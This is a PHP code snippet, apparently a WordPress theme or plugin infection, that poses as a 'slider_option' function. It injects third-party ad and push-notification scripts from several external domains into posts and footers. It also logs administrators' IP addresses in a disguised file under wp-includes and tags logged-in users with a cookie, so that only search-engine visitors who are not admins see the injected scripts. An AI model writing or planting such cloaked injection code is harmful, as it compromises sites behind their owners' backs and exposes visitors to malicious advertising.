ini_set('display_errors', 0);
error_reporting(0);
$wp_auth_key='bb9aed696b080d6d327d927fc0b733d8';



if ( ! function_exists( 'slider_option' ) ) {  

function slider_option($content){ 
if(is_single())
{




$con = '
';

$con2 = '

<script type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1594340"></script>
<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1594343&interactive=1&pushup=1"></script>
<script src="//pushnest.com/ntfc.php?p=1594344" data-cfasync="false" async></script>
<script src="//go.mobtrks.com/notice.php?p=1594346&interstitial=1"></script>
';

$content=$content.$con2;
}
return $content;
} 

function slider_option_footer(){ 
if(!is_single())
{




$con2 = '

<script type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1594340"></script>
<script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1594343&interactive=1&pushup=1"></script>
<script src="//pushnest.com/ntfc.php?p=1594344" data-cfasync="false" async></script>
<script src="//go.mobtrks.com/notice.php?p=1594346&interstitial=1"></script>

';

echo $con2;
}
} 








function setting_my_first_cookie() {
  setcookie( 'wordpress_cf_adm_use_adm',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }


if(is_user_logged_in())
{
add_action( 'init', 'setting_my_first_cookie',1 );
}







if( current_user_can('edit_others_pages'))
{

if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
{
$ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
}

if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
{
$ip.=$_SERVER['REMOTE_ADDR'].'
';
@file_put_contents(ABSPATH.'wp-includes/wp-feed.php',$ip);


}



}






$ref = $_SERVER['HTTP_REFERER'];
$SE = array('google.','/search?','images.google.', 'web.info.com', 'search.','yahoo.','yandex','msn.','baidu','bing.','doubleclick.net','googleweblight.com');
foreach ($SE as $source) {
  if (strpos($ref,$source)!==false) {
    setcookie("sevisitor", 1, time()+120, COOKIEPATH, COOKIE_DOMAIN); 
	$sevisitor=true;
  }
}






if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in()) 
{
$adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
{
if($sevisitor==true || isset($_COOKIE['sevisitor']))
{
add_filter('the_content','slider_option');
add_action('wp_footer','slider_option_footer');
}

}

} 





}